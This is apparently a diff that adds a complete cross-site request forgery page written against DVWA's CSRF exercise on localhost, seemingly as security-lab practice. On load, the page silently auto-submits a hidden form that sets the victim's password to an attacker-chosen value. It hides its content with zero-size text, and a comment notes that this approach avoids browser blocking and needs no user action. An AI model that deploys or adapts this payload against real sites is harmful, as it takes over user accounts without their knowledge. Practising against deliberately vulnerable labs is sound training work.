@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+	<body onload="document.forms[0].submit()">
+		<style>
+			body {
+			font-size: 0px;
+			}
+		</style>
+		<!--This is the unique method that is not blocked by the browser and needs no action from the user. The image src method is blocked-->
+		<form action="http://127.0.0.1/vulnerabilities/csrf/" method="get">
+			<input type="hidden" name="password_new" value="hammadia">
+			<input type="hidden" name="password_conf" value="hammadia">
+			<input type="hidden" name="Change" value="Change">
+			<input type="submit" name="sub" id="toClick">
+		</form>
+	</body>
+</html>
